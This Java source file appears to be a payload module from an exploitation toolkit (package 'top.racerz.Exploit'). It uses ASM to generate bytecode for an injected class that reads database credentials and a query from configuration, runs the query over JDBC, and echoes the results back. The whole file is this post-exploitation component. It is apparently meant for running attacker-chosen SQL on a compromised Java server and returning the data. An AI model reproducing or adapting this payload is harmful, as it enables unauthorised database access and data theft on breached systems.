package top.racerz.Exploit;

import org.objectweb.asm.*;
import top.racerz.utils.StringUtil;

public class SQLQuery implements Opcodes {

    public static void insert(ClassWriter cw) {

        String driver = StringUtil.getCurrentPropertiesValue("driver");
        String url = StringUtil.getCurrentPropertiesValue("url");
        String username = StringUtil.getCurrentPropertiesValue("username");
        String password = StringUtil.getCurrentPropertiesValue("password");
        String query = StringUtil.getCurrentPropertiesValue("query");

        FieldVisitor fv;
        MethodVisitor mv;

        {
            fv = cw.visitField(ACC_PRIVATE, "result", "Ljava/lang/String;", null, null);
            fv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label l0 = new Label();
            Label l1 = new Label();
            Label l2 = new Label();
            mv.visitTryCatchBlock(l0, l1, l2, "java/lang/Exception");
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(11, l3);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
            mv.visitLabel(l0);
            mv.visitLineNumber(13, l0);
            mv.visitLdcInsn(driver);
            mv.visitVarInsn(ASTORE, 1);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(14, l4);
            mv.visitLdcInsn(url);
            mv.visitVarInsn(ASTORE, 2);
            Label l5 = new Label();
            mv.visitLabel(l5);
            mv.visitLineNumber(15, l5);
            mv.visitLdcInsn(username);
            mv.visitVarInsn(ASTORE, 3);
            Label l6 = new Label();
            mv.visitLabel(l6);
            mv.visitLineNumber(16, l6);
            mv.visitLdcInsn(password);
            mv.visitVarInsn(ASTORE, 4);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitLineNumber(17, l7);
            mv.visitLdcInsn(query);
            mv.visitVarInsn(ASTORE, 5);
            Label l8 = new Label();
            mv.visitLabel(l8);
            mv.visitLineNumber(19, l8);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitInsn(POP);
            Label l9 = new Label();
            mv.visitLabel(l9);
            mv.visitLineNumber(20, l9);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitMethodInsn(INVOKESTATIC, "java/sql/DriverManager", "getConnection", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/sql/Connection;", false);
            mv.visitVarInsn(ASTORE, 6);
            Label l10 = new Label();
            mv.visitLabel(l10);
            mv.visitLineNumber(21, l10);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/sql/Connection", "prepareStatement", "(Ljava/lang/String;)Ljava/sql/PreparedStatement;", true);
            mv.visitVarInsn(ASTORE, 7);
            Label l11 = new Label();
            mv.visitLabel(l11);
            mv.visitLineNumber(22, l11);
            mv.visitVarInsn(ALOAD, 7);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/sql/PreparedStatement", "executeQuery", "()Ljava/sql/ResultSet;", true);
            mv.visitVarInsn(ASTORE, 8);
            Label l12 = new Label();
            mv.visitLabel(l12);
            mv.visitLineNumber(24, l12);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitLdcInsn("");
            mv.visitFieldInsn(PUTFIELD, "SQLQuery", "result", "Ljava/lang/String;");
            Label l13 = new Label();
            mv.visitLabel(l13);
            mv.visitFrame(Opcodes.F_FULL, 9, new Object[]{"SQLQuery", "java/lang/String", "java/lang/String", "java/lang/String", "java/lang/String", "java/lang/String", "java/sql/Connection", "java/sql/PreparedStatement", "java/sql/ResultSet"}, 0, new Object[]{});
            mv.visitVarInsn(ALOAD, 8);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/sql/ResultSet", "next", "()Z", true);
            Label l14 = new Label();
            mv.visitJumpInsn(IFEQ, l14);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitTypeInsn(NEW, "java/lang/StringBuilder");
            mv.visitInsn(DUP);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitFieldInsn(GETFIELD, "SQLQuery", "result", "Ljava/lang/String;");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitLdcInsn(" ");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitVarInsn(ALOAD, 8);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/sql/ResultSet", "getObject", "(I)Ljava/lang/Object;", true);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/Object;)Ljava/lang/StringBuilder;", false);
            mv.visitLdcInsn("\n");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
            mv.visitFieldInsn(PUTFIELD, "SQLQuery", "result", "Ljava/lang/String;");
            mv.visitJumpInsn(GOTO, l13);
            mv.visitLabel(l14);
            mv.visitLineNumber(28, l14);
            mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            mv.visitVarInsn(ALOAD, 8);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/sql/ResultSet", "close", "()V", true);
            Label l15 = new Label();
            mv.visitLabel(l15);
            mv.visitLineNumber(29, l15);
            mv.visitVarInsn(ALOAD, 7);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/sql/PreparedStatement", "close", "()V", true);
            Label l16 = new Label();
            mv.visitLabel(l16);
            mv.visitLineNumber(30, l16);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/sql/Connection", "close", "()V", true);
            mv.visitLabel(l1);
            mv.visitLineNumber(33, l1);
            Label l17 = new Label();
            mv.visitJumpInsn(GOTO, l17);
            mv.visitLabel(l2);
            mv.visitLineNumber(31, l2);
            mv.visitFrame(Opcodes.F_FULL, 1, new Object[]{"SQLQuery"}, 1, new Object[]{"java/lang/Exception"});
            mv.visitVarInsn(ASTORE, 1);
            Label l18 = new Label();
            mv.visitLabel(l18);
            mv.visitLineNumber(32, l18);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitLdcInsn("\u6267\u884c SQL \u8bed\u53e5\u9519\u8bef");
            mv.visitFieldInsn(PUTFIELD, "SQLQuery", "result", "Ljava/lang/String;");
            mv.visitLabel(l17);
            mv.visitLineNumber(35, l17);
            mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKEVIRTUAL, "SQLQuery", "echo", "()V", false);
            Label l19 = new Label();
            mv.visitLabel(l19);
            mv.visitLineNumber(36, l19);
            mv.visitInsn(RETURN);
            Label l20 = new Label();
            mv.visitLabel(l20);
            mv.visitLocalVariable("driver", "Ljava/lang/String;", null, l4, l1, 1);
            mv.visitLocalVariable("url", "Ljava/lang/String;", null, l5, l1, 2);
            mv.visitLocalVariable("username", "Ljava/lang/String;", null, l6, l1, 3);
            mv.visitLocalVariable("password", "Ljava/lang/String;", null, l7, l1, 4);
            mv.visitLocalVariable("sql", "Ljava/lang/String;", null, l8, l1, 5);
            mv.visitLocalVariable("connection", "Ljava/sql/Connection;", null, l10, l1, 6);
            mv.visitLocalVariable("pstt", "Ljava/sql/PreparedStatement;", null, l11, l1, 7);
            mv.visitLocalVariable("rs", "Ljava/sql/ResultSet;", null, l12, l1, 8);
            mv.visitLocalVariable("e", "Ljava/lang/Exception;", null, l18, l17, 1);
            mv.visitLocalVariable("this", "LSQLQuery;", null, l3, l20, 0);
            mv.visitMaxs(4, 9);
            mv.visitEnd();
        }
    }
}
